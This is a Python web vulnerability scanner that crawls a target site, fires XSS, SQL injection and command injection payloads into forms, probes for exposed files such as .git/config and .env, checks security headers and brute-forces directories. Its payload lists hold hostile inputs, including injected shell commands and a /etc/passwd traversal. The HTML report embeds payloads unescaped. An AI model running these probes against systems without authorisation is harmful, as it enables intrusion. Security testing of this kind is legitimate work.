
import requests
import argparse
import logging
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import threading
from concurrent.futures import ThreadPoolExecutor
import time
import datetime
from colorama import init, Fore, Style

# Initialize Colorama
init(autoreset=True)

# --- Payloads and Configuration ---
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "'<script>alert('XSS')</script>",
    "<svg/onload=alert('XSS')>",
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "' OR 1=1 --",
    "' OR 1=1#",
    "admin'--",
    "' OR 'a'='a",
]

CMD_INJECTION_PAYLOADS = [
    "; ls -la",
    "| ls -la",
    "&& dir",
    "| dir",
]

LFI_RFI_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../windows/win.ini",
    "http://example.com/malicious_script.txt" # Example RFI
]

OPEN_REDIRECT_PAYLOADS = [
    "http://google.com",
    "//google.com",
    "/google.com"
]

SENSITIVE_FILES = [
    "robots.txt",
    "sitemap.xml",
    ".git/config",
    "/.env",
    "/backup.zip",
    "/admin",
    "/config.php.bak",
]

COMMON_DIRECTORIES = [
    "admin", "login", "dashboard", "uploads", "test", "backup", "dev", "api", "v1", "v2"
]

# --- Logger Setup ---
def setup_logger():
    """Sets up a logger for file and console output."""
    logger = logging.getLogger('VulnScanner')
    logger.setLevel(logging.INFO)
    
    # File handler for logging
    file_handler = logging.FileHandler('vulnerability_scan.log')
    file_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
    
    # Console handler for clean output
    console_handler = logging.StreamHandler()
    console_handler.setFormatter(logging.Formatter('%(message)s'))

    logger.addHandler(file_handler)
    logger.addHandler(console_handler)
    
    return logger

logger = setup_logger()

class ReportGenerator:
    """Generates an HTML report of the scan findings."""
    def __init__(self, target, vulnerabilities, start_time, end_time):
        self.target = target
        self.vulnerabilities = vulnerabilities
        self.scan_duration = end_time - start_time

    def generate_html(self, output_file):
        """Creates and saves the HTML report."""
        html = f"""
        <html>
        <head>
            <title>Vulnerability Scan Report</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 2em; }}
                h1, h2 {{ color: #333; }}
                table {{ width: 100%; border-collapse: collapse; }}
                th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
                th {{ background-color: #f2f2f2; }}
                .summary {{ background-color: #eee; padding: 1em; margin-bottom: 1em; }}
                .vuln-high {{ color: red; font-weight: bold; }}
                .vuln-medium {{ color: orange; }}
                .vuln-low {{ color: #555; }}
            </style>
        </head>
        <body>
            <h1>Vulnerability Scan Report</h1>
            <div class="summary">
                <h2>Scan Summary</h2>
                <p><strong>Target URL:</strong> {self.target}</p>
                <p><strong>Scan Duration:</strong> {self.scan_duration}</p>
                <p><strong>Total Vulnerabilities Found:</strong> {len(self.vulnerabilities)}</p>
            </div>
            <h2>Vulnerabilities</h2>
            <table>
                <tr>
                    <th>Type</th>
                    <th>URL</th>
                    <th>Parameter/Details</th>
                    <th>Payload</th>
                    <th>Severity</th>
                </tr>
        """
        
        for vuln in self.vulnerabilities:
            severity_class = {
                "High": "vuln-high",
                "Medium": "vuln-medium",
                "Low": "vuln-low"
            }.get(vuln.get('severity', 'Low'), 'vuln-low')

            html += f"""
                <tr>
                    <td class="{severity_class}">{vuln['type']}</td>
                    <td>{vuln['url']}</td>
                    <td>{vuln.get('parameter', 'N/A')}</td>
                    <td>{vuln.get('payload', 'N/A')}</td>
                    <td class="{severity_class}">{vuln.get('severity', 'Low')}</td>
                </tr>
            """
        
        html += """
            </table>
        </body>
        </html>
        """
        
        with open(output_file, 'w') as f:
            f.write(html)
        logger.info(f"{Fore.GREEN}[+] HTML report generated: {output_file}")

class Scanner:
    """The main vulnerability scanner class."""
    def __init__(self, target_url, num_threads=10):
        self.target_url = target_url
        self.target_domain = urlparse(target_url).netloc
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'})
        self.links_to_scan = {self.target_url}
        self.scanned_links = set()
        self.vulnerabilities = []
        self.num_threads = num_threads

    def _get_forms(self, url):
        """Extracts all forms from a given URL."""
        try:
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.content, 'html.parser')
            return soup.find_all('form')
        except requests.RequestException as e:
            logger.warning(f"{Fore.YELLOW}[!] Could not fetch forms from {url}: {e}")
            return []

    def _get_links(self, url):
        """Extracts all links from a given URL."""
        try:
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.content, 'html.parser')
            for link in soup.find_all('a', href=True):
                href = link['href']
                full_url = urljoin(url, href)
                if self.target_domain in urlparse(full_url).netloc:
                    self.links_to_scan.add(full_url)
        except requests.RequestException as e:
            logger.warning(f"{Fore.YELLOW}[!] Could not fetch links from {url}: {e}")

    def crawl(self):
        """Crawls the website to discover links and forms."""
        logger.info(f"{Fore.CYAN}[*] Starting crawl on {self.target_url}...")
        initial_links_count = len(self.links_to_scan)
        
        while self.links_to_scan:
            url = self.links_to_scan.pop()
            if url in self.scanned_links:
                continue
            
            self.scanned_links.add(url)
            logger.info(f"{Fore.CYAN}[CRAWLING] -> {url}")
            self._get_links(url)

        logger.info(f"{Fore.GREEN}[+] Crawl complete. Found {len(self.scanned_links)} unique links.")

    def _submit_form(self, form, url, value):
        """Submits a form with a given value in all its inputs."""
        action = form.get('action')
        post_url = urljoin(url, action)
        method = form.get('method', 'get').lower()
        
        inputs_list = form.find_all(['input', 'textarea'])
        post_data = {}
        for input_tag in inputs_list:
            input_name = input_tag.get('name')
            input_type = input_tag.get('type', 'text')
            if input_name:
                if input_type == 'text':
                    post_data[input_name] = value
                else: # for other input types, use their default value
                    post_data[input_name] = input_tag.get('value', '')
        
        try:
            if method == 'post':
                return self.session.post(post_url, data=post_data, timeout=10)
            else:
                return self.session.get(post_url, params=post_data, timeout=10)
        except requests.RequestException as e:
            logger.warning(f"{Fore.YELLOW}[!] Form submission failed for {post_url}: {e}")
            return None

    def scan_xss(self, url):
        """Scans for Reflected XSS vulnerabilities."""
        logger.info(f"{Fore.CYAN}[*] Scanning for XSS on {url}")
        forms = self._get_forms(url)
        for form in forms:
            for payload in XSS_PAYLOADS:
                response = self._submit_form(form, url, payload)
                if response and payload in response.text:
                    vuln = {
                        'type': 'Reflected XSS',
                        'url': url,
                        'parameter': 'Form input',
                        'payload': payload,
                        'severity': 'High'
                    }
                    self.vulnerabilities.append(vuln)
                    logger.info(f"{Fore.RED}[VULNERABILITY] {vuln}")

    def scan_sql_injection(self, url):
        """Scans for SQL Injection vulnerabilities."""
        logger.info(f"{Fore.CYAN}[*] Scanning for SQL Injection on {url}")
        forms = self._get_forms(url)
        for form in forms:
            for payload in SQLI_PAYLOADS:
                response = self._submit_form(form, url, payload)
                if response and "sql syntax" in response.text.lower():
                    vuln = {
                        'type': 'SQL Injection',
                        'url': url,
                        'parameter': 'Form input',
                        'payload': payload,
                        'severity': 'High'
                    }
                    self.vulnerabilities.append(vuln)
                    logger.info(f"{Fore.RED}[VULNERABILITY] {vuln}")

    def scan_command_injection(self, url):
        """Scans for Command Injection vulnerabilities."""
        logger.info(f"{Fore.CYAN}[*] Scanning for Command Injection on {url}")
        forms = self._get_forms(url)
        for form in forms:
            for payload in CMD_INJECTION_PAYLOADS:
                response = self._submit_form(form, url, payload)
                # A simple check: look for command output. More advanced checks would use time-based techniques.
                if response and ("total" in response.text or "Volume" in response.text):
                    vuln = {
                        'type': 'Command Injection',
                        'url': url,
                        'parameter': 'Form input',
                        'payload': payload,
                        'severity': 'High'
                    }
                    self.vulnerabilities.append(vuln)
                    logger.info(f"{Fore.RED}[VULNERABILITY] {vuln}")

    def check_sensitive_files(self):
        """Checks for common sensitive files."""
        logger.info(f"{Fore.CYAN}[*] Checking for sensitive files...")
        for path in SENSITIVE_FILES:
            full_url = urljoin(self.target_url, path)
            try:
                response = self.session.get(full_url, timeout=5)
                if response.status_code == 200:
                    vuln = {
                        'type': 'Sensitive File Exposed',
                        'url': full_url,
                        'details': f"Found with status code {response.status_code}",
                        'severity': 'Medium'
                    }
                    self.vulnerabilities.append(vuln)
                    logger.info(f"{Fore.RED}[VULNERABILITY] {vuln}")
            except requests.RequestException:
                continue

    def check_security_headers(self):
        """Audits security headers of the main page."""
        logger.info(f"{Fore.CYAN}[*] Auditing security headers...")
        try:
            response = self.session.get(self.target_url, timeout=10)
            headers = response.headers
            missing_headers = []
            
            if 'Strict-Transport-Security' not in headers:
                missing_headers.append('Strict-Transport-Security')
            if 'Content-Security-Policy' not in headers:
                missing_headers.append('Content-Security-Policy')
            if 'X-Content-Type-Options' not in headers:
                missing_headers.append('X-Content-Type-Options')
            if 'X-Frame-Options' not in headers:
                missing_headers.append('X-Frame-Options')

            if missing_headers:
                vuln = {
                    'type': 'Missing Security Headers',
                    'url': self.target_url,
                    'details': f"Missing: {', '.join(missing_headers)}",
                    'severity': 'Low'
                }
                self.vulnerabilities.append(vuln)
                logger.info(f"{Fore.YELLOW}[VULNERABILITY] {vuln}")
        except requests.RequestException as e:
            logger.warning(f"{Fore.YELLOW}[!] Could not fetch headers: {e}")

    def _check_directory(self, path):
        """Worker function for directory brute-forcing."""
        url = urljoin(self.target_url, path)
        try:
            response = self.session.head(url, timeout=5, allow_redirects=False)
            if response.status_code in [200, 301, 302, 403]:
                vuln = {
                    'type': 'Directory/File Found',
                    'url': url,
                    'details': f"Found with status code {response.status_code}",
                    'severity': 'Low'
                }
                self.vulnerabilities.append(vuln)
                logger.info(f"{Fore.GREEN}[FOUND] {url} (Status: {response.status_code})")
        except requests.RequestException:
            pass

    def brute_force_directories(self, wordlist_path=None):
        """Performs multithreaded directory brute-forcing."""
        logger.info(f"{Fore.CYAN}[*] Starting directory brute-forcing...")
        
        words = COMMON_DIRECTORIES
        if wordlist_path:
            try:
                with open(wordlist_path, 'r') as f:
                    words = [line.strip() for line in f]
            except FileNotFoundError:
                logger.error(f"{Fore.RED}[!] Wordlist not found at {wordlist_path}. Using internal list.")

        with ThreadPoolExecutor(max_workers=self.num_threads) as executor:
            executor.map(self._check_directory, words)
        logger.info(f"{Fore.GREEN}[+] Directory brute-forcing complete.")

    def run_scanner(self, wordlist_path=None):
        """Runs the full scan suite."""
        self.crawl()
        self.check_security_headers()
        self.check_sensitive_files()
        
        for link in list(self.scanned_links):
            self.scan_xss(link)
            self.scan_sql_injection(link)
            self.scan_command_injection(link)
            # Add other scan calls here as they are implemented

        self.brute_force_directories(wordlist_path)
        logger.info(f"\n{Fore.GREEN}Scan finished. Found {len(self.vulnerabilities)} vulnerabilities.")

def print_banner():
    """Prints the ASCII art banner for the tool."""
    banner = """
╔══════════════════════════════════════════════╗
║                VULN_SCANNER                  ║
║        Web Application Vulnerability Tool    ║
╚══════════════════════════════════════════════╝
"""
    print(Fore.CYAN + Style.BRIGHT + banner)

def main():
    """Main function to parse arguments and run the scanner."""
    print_banner() # Call the banner function here
    parser = argparse.ArgumentParser(description="A simple web application vulnerability scanner.")
    parser.add_argument("url", help="The target URL to scan.")
    parser.add_argument("-o", "--output", default="report.html", help="Output HTML report file name.")
    parser.add_argument("-w", "--wordlist", help="Path to a custom wordlist for directory brute-forcing.")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads for directory brute-forcing.")
    
    args = parser.parse_args()

    logger.info(Style.BRIGHT + f"--- Starting Scan on {args.url} ---")
    start_time = datetime.datetime.now()

    scanner = Scanner(args.url, args.threads)
    try:
        scanner.run_scanner(args.wordlist)
    except KeyboardInterrupt:
        logger.info(f"\n{Fore.YELLOW}[!] Scan interrupted by user.")
    except Exception as e:
        logger.error(f"{Fore.RED}[!] An unexpected error occurred: {e}")
    finally:
        end_time = datetime.datetime.now()
        logger.info(Style.BRIGHT + "--- Scan Complete ---")
        
        report_generator = ReportGenerator(args.url, scanner.vulnerabilities, start_time, end_time)
        report_generator.generate_html(args.output)

if __name__ == "__main__":
    main()
